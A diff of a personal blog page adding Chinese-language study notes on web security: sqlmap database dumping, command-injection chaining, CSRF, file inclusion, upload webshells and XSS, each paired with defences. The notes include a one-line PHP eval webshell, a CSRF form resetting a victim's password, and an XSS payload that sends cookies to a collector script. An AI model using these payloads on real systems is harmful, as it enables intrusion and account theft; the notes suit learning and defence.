@@ -6,14 +6,21 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | welcome to here</title>
+  <title>web安全 | welcome to here</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="welcome to here">
-<meta property="og:url" content="http://yoursite.com/archives/page/3/index.html">
+  <meta name="description" content="web安全工具以及一些招式实现原理以及测试思路的是靠更重要">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web安全">
+<meta property="og:url" content="http://yoursite.com/2018/03/15/web安全/index.html">
 <meta property="og:site_name" content="welcome to here">
+<meta property="og:description" content="web安全工具以及一些招式实现原理以及测试思路的是靠更重要">
+<meta property="og:image" content="http://ww4.sinaimg.cn/large/0069oIoUgy1fpj0x87rfij30jw0b9q4j.jpg">
+<meta property="og:image" content="http://ww3.sinaimg.cn/large/0069oIoUgy1fpj1fd28poj30jd0b0gnc.jpg">
+<meta property="og:updated_time" content="2018-03-25T03:20:36.499Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="welcome to here">
+<meta name="twitter:title" content="web安全">
+<meta name="twitter:description" content="web安全工具以及一些招式实现原理以及测试思路的是靠更重要">
+<meta name="twitter:image" content="http://ww4.sinaimg.cn/large/0069oIoUgy1fpj0x87rfij30jw0b9q4j.jpg">
   
     <link rel="alternative" href="/atom.xml" title="welcome to here" type="application/atom+xml">
   
@@ -145,214 +152,249 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-web安全" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      web安全
+    </h1>
+  
+
+        
+        <a href="/2018/03/15/web安全/" class="archive-article-date">
+  	<time datetime="2018-03-15T05:01:37.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-03-15</time>
+</a>
+        
+      </header>
     
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>web安全工具以及一些招式<br>实现原理以及测试思路的是靠更重要<br><a id="more"></a></p>
+<h2 id="后台管理界面的一些登陆方式"><a href="#后台管理界面的一些登陆方式" class="headerlink" title="后台管理界面的一些登陆方式"></a>后台管理界面的一些登陆方式</h2><p>1.当网站用前端的js代码来验证用户或管理员的身份时，可以在浏览器中设置禁用js，阻止跳转，，越权访问后台</p>
+<ol>
+<li><p>准备webshell文件名列表，敏感文件扫描，验证页面是webshell猜测密码若为弱口令则进入</p>
+<h2 id="敏感文件探测"><a href="#敏感文件探测" class="headerlink" title="敏感文件探测"></a>敏感文件探测</h2><p>敏感文件：</p>
+<pre><code>一般有login.php(后台脚本文件)后台登陆
+数据文件.sql
+备份文件.tar.gz，rar
+webshell文件
+</code></pre><p>判断网站脚本类型：<br>   通过输入index.asp,index.php等来判断</p>
+<h2 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h2><p>AWVS扫描流程：<br>   1.扫描配置与目标基本信息探测<br>   2.爬虫：目标站点爬取<br>   3.各个漏洞探测模块：具体的漏洞测试<br>   4.漏洞结果记录和呈现<br> 扫描工具需要明确的问题：</p>
+<pre><code>1.对目标站点的误伤（高流量，请求了危险功能）
+2.漏扫的盲区：逻辑漏洞（订单金额数据篡改漏洞）
+</code></pre><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>sql注入的成因是因为服务器服务器要执行的数据库代码拼接了用户输入的数据即将数据当成了代码</p>
+<h3 id="发现和利用sql注入漏洞基本流程"><a href="#发现和利用sql注入漏洞基本流程" class="headerlink" title="发现和利用sql注入漏洞基本流程"></a>发现和利用sql注入漏洞基本流程</h3><ol>
+<li>找到有数据库交互的功能页面<br>2.判断叶敏啊是否存在注入<br>3.利用sql注入漏洞读取数据<br>4.导出所需数据保存<h3 id="sqlmap的一些基本用法"><a href="#sqlmap的一些基本用法" class="headerlink" title="sqlmap的一些基本用法"></a>sqlmap的一些基本用法</h3>判断注入点：<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"目标URL"</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>判断数据库的用户</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"目标URL"</span> --user</span><br></pre></td></tr></table></figure>
+<p>查看数据库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"目标URL"</span> --dbs</span><br></pre></td></tr></table></figure>
+<p>查看当前的数据库用户和数据库</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"目标URL"</span> --current-user --current-db</span><br></pre></td></tr></table></figure>
+<p>获得当前数据库中数据表的信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"目标URL"</span> --tables -D <span class="string">"当前数据库名"</span></span><br></pre></td></tr></table></figure>
+<p>读取目标表的列信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"目标URL"</span> --columns -T <span class="string">"表名"</span> -D <span class="string">"数据库名"</span></span><br></pre></td></tr></table></figure>
+<p>查看数据表中的数据记录条数</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"目标URL"</span> --count -T <span class="string">"表名"</span> -D <span class="string">"数据库名"</span></span><br></pre></td></tr></table></figure>
+<p>查看数据表中的全部信息</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"目标URL"</span> --dump -T <span class="string">"表名"</span> -D “数据库名”</span><br></pre></td></tr></table></figure>
+<p>设置要查看数据的位置</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"目标URL"</span> --dump -T <span class="string">"表名"</span> -D <span class="string">"数据库名"</span></span><br></pre></td></tr></table></figure>
+<p>遍历当前数据库的所有表并且下载</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"目标URL"</span> -p “攻击的参数” --dump-all -D <span class="string">"数据库名"</span></span><br></pre></td></tr></table></figure>
+<p>post方式注入</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">"目标URL"</span> --data<span class="string">"&amp;"</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h2 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h2><p>owasp zap(截取和处理代理端口的数据包)<br>user_token(动态改变且不可预测的随机字符串，由上一次的发送之后服务器返回包中包含的user_token)<br>预防的方法：<br>   1.限制登陆错误的次数<br>   2.验证码</p>
+<h2 id="命令注入漏洞的过程和技巧"><a href="#命令注入漏洞的过程和技巧" class="headerlink" title="命令注入漏洞的过程和技巧"></a>命令注入漏洞的过程和技巧</h2><p>   命令注入（通过web程序在服务器上拼接系统命令）<br>   预防方式：使用命令白名单<br>   命令拼接符的区别;<br>     1.A&amp;B:简单的拼接AB之间无制约关系<br>     2.A&amp;&amp;B:A执行成功，然后才会执行B<br>     3.A|B:A的输出，作为B的输入<br>     4.A||B：A执行失败，然后才会执行B<br>    过滤绕过：<br>       whoami被过滤了 可以用双引号过滤who””ami</p>
+<h2 id="csrf攻击（跨站请求伪造）"><a href="#csrf攻击（跨站请求伪造）" class="headerlink" title="csrf攻击（跨站请求伪造）"></a>csrf攻击（跨站请求伪造）</h2><p>   受害者角度：用户在当前已登陆的web应用程序上执行非本意操作<br>   攻击者角度：攻击者欺骗浏览器，让其以受害者的名义执行自己想要的操作<br>   攻击者伪造html诱导受害者点击<br>伪造表单获得受害者登陆信息<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;body&gt; </span><br><span class="line">     &lt;form action=<span class="string">"能够改变受害者登陆口令或获得受害者登陆令牌的url"</span>&gt;</span><br><span class="line">	 &lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"paasword_new"</span> value=<span class="string">"hacker"</span>/&gt;</span><br><span class="line">	 &lt;input <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"password_conf"</span> value=<span class="string">"hacker"</span>&gt;</span><br><span class="line">	 &lt;input <span class="built_in">type</span>=<span class="string">"sumbit"</span> value=<span class="string">"Click Me"</span>/&gt;</span><br><span class="line">	 &lt;/form&gt;</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+<p>预防方法：<br>使用http请求头的referer来判断是否是有效可靠来源<br>使用随机数csrf Token，保证攻击者无法猜测到所有参数<br>输入原始口令来修改密码</p>
+<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>  一种代码处理方法，函数如include，require等，参数是文件名，文件名参数用户可控且过滤不严，被攻击者偷梁换柱<br> 需要在服务端开启allow_url_include参数才能进行文件包含<br> 使用../来实现文件夹下目录的切换从而来读其他路径的文件信息<br> 远程执行文件page=远程文件url（只要包含脚本内容就会被执行）<br> 执行过程：(远程文件若为脚本文件则只在攻击者那里执行，若为文本文件则会在被攻击者服务端执行)<br> <img src="http://ww4.sinaimg.cn/large/0069oIoUgy1fpj0x87rfij30jw0b9q4j.jpg" alt="image"><br> 用file协议来绕过过滤：file://加物理路劲(文件传输协议，访问本地计算机中的文件)<br> 攻击者思路：<br> <img src="http://ww3.sinaimg.cn/large/0069oIoUgy1fpj1fd28poj30jd0b0gnc.jpg" alt="image"><br>使用黑名单或白名单的方式（白更有效）</p>
+<h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>   web允许用户上传恶意代码文件，并在服务器上运行。<br>   上传一句话webshell&lt;?php @eval($_GET[‘cmd’]);?&gt;<br>   使用方法：抓包改包判断文件类型<br>             制作内涵图 使用copy 1.jpg/b+1.txt 2.jpg<br>   nigix畸形解析：xxx.xxx/xxx.php（只要前面的文件存在就会当成php文件执行）<br>预防方法：<br>  1.阻止非法文件上传<br>   文件后缀名的白名单，文件类型和文件内容的判断<br>  2.组织非法文件执行<br>       文件重命名， 文件压缩重生成，存储目录执行权限，存储目录与web分离</p>
+<h2 id="sql注入-1"><a href="#sql注入-1" class="headerlink" title="sql注入"></a>sql注入</h2><p>   回显注入：<br>        mysql中载入文件信息load_file(“路径”)<br>        写入webshell的union select into outfile  “路径”<br>        当使用sqlmap注入时若有链接跳转需用–second-order来跳转<br>    盲注：（数据库的执行结果不会直接显示到页面上，页面只会显示真和假两种状态）<br>       基于时间： 最常用if函数if(expr1,expr2(true),expr3(false))最为常用的函数是sleep()和benchmark(count,expr)里面的count参数为重复次数可以将重复次数提高来达到延时的效果。<br>       基于bool：根据页面的返回真假<br>     cast(expression as data_type)翻译为 数据类型转换(表达式 as 新的数据类型)<br>     ifnull(expr1,expr2)如果expr1是null，返回expr2，否则返回本身<br>     sqlmap检测cookie参数要将level设置成2以上<br>    预防方法：<br>        参数化sql语句，预编译<br>        数据类型的检测<br>        用户输入过滤</p>
+<h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>   客户端代码注入通常是javascript。</p>
+<h3 id="存储型xss"><a href="#存储型xss" class="headerlink" title="存储型xss"></a>存储型xss</h3><pre><code>攻击代码在数据库里输出在http响应中
+</code></pre><h3 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h3><pre><code>攻击代码在url里输出在http响应中
+攻击思路：
+![image](http://ww2.sinaimg.cn/large/0069oIoUgy1fpo75xaaplj30dx0ah75t.jpg)
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">用于攻击的js代码(需要进行urldecode)</span><br><span class="line">&lt;script&gt;document.location=<span class="string">'http://127.0.0.1/cookie.php?cookie='</span>+document.cookie&lt;/script&gt;</span><br><span class="line">服务端代码；将前面劫持来的cookie写入text文本中</span><br><span class="line">&lt;?php</span><br><span class="line">    <span class="variable">$cookie</span>=<span class="variable">$_GET</span>[<span class="string">'cookie'</span>];</span><br><span class="line"> file_put_contents(<span class="string">'cookie.txt'</span>,<span class="variable">$cookie</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+绕过方法：
+    1.大小写混写
+    2.嵌套写入
+    3.注释符过滤
+    4.使用img标签来绕过&lt;img src=x onerror=alert(1)&gt;(当script标签被过滤)
+    5.&lt;iframe onload=alert(1)&gt;当script标签被过滤
+</code></pre><h3 id="DOM型xss"><a href="#DOM型xss" class="headerlink" title="DOM型xss"></a>DOM型xss</h3><pre><code>攻击代码在url里输出在dom节点中
+</code></pre><p>预防方法：<br>   1.过滤用户输入白名单（在服务端限制输入长度）<br>   2.输出过滤使用htmlspecialchars（将一些特殊的符号转换成html编码）该函数默认不编码单引号或者使用js转义<br>     &amp;  =&gt;&amp;<br>     “  =&gt;&quot;<br>     ‘  =&gt;&apos;<br>     &lt;  =&gt;&lt;<br>     &gt;  =&gt;&gt;</p>
+<h2 id="web安全框架建设"><a href="#web安全框架建设" class="headerlink" title="web安全框架建设"></a>web安全框架建设</h2><pre><code>### 企业的sdl（安全开发生产周期）流程：
+    提升web应用的安全性，减少web应用的安全漏洞。
+   ![image](http://ww4.sinaimg.cn/large/0069oIoUgy1fpou23etcwj30bu06p3za.jpg)
+### 漏洞和事件处理：
+  发现方法：
+    1.安全需求分析
+           使用web框架和语言的选型建议
+           敏感信息如密码的保存方案（如加盐后强hash的方案）
+           是否有上传功能
+    2.安全扫描：
+         通过扫描器发现安全问题
+         自动化
+         周期性执行
+    3.入侵检测
+         项目上线之后进行监控
+         包含多种检测方式
+         通过监控入侵行为发现安全问题    
+    4.日志分析
+       可疑日志+人工分析
+       可疑日志+扫描器
+    5.简历src（安全应急响应中心）    
+  处理方法:
+     1.输入检查
+        在服务端检查
+        数据合法性校验：类型，范围，长度
+        尽可能使用‘白名单’    
+     2.    输出检查
+           在数据输出的点，也需要做一些特定的过滤和转义
+           比如xss，输出到html标签时就需要进行html编码    
+     3.waf防御
+         web application firewall
+         web应用防火墙
+         能够拦截攻击，如针对sql注入，xss和远程代码执行等漏洞进行的攻击
+</code></pre>
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2017" class="archive-year">2017</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/11/22/ctfwp之web/" class="archive-article-date">
-  	<time datetime="2017-11-22T03:22:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-22</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/11/22/ctfwp之web/">ctfwp之web</a>
-    </h1>
-  
+      
 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2018/03/15/web安全/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/11/16/wifi干扰攻击/" class="archive-article-date">
-  	<time datetime="2017-11-16T12:42:09.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-16</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2018/03/12/csrf学习/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">web学习</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/11/16/wifi干扰攻击/">wifi干扰攻击</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/11/15/sql注入学习/" class="archive-article-date">
-  	<time datetime="2017-11-15T00:53:24.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-15</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/11/15/sql注入学习/">sql注入学习</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/11/01/ctfwp之杂项/" class="archive-article-date">
-  	<time datetime="2017-11-01T03:22:12.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-11-01</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/11/01/ctfwp之杂项/">ctfwp之杂项</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/10/14/微信小程序制作简单教程/" class="archive-article-date">
-  	<time datetime="2017-10-14T13:22:52.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-10-14</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/10/14/微信小程序制作简单教程/">微信小程序制作简单教程</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/09/21/unbuntu中tomcat安装过程/" class="archive-article-date">
-  	<time datetime="2017-09-21T03:14:10.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-21</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/09/21/unbuntu中tomcat安装过程/">unbuntu中tomcat安装过程</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2017/09/02/sql注入语句大全/" class="archive-article-date">
-  	<time datetime="2017-09-02T08:38:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-02</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2017/09/02/sql注入语句大全/">sql注入语句大全</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/page/2/">&laquo; Prev</a><a class="page-number" href="/archives/">1</a><a class="page-number" href="/archives/page/2/">2</a><span class="page-number current">3</span>
-    </nav>
   
 
 
@@ -376,8 +418,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
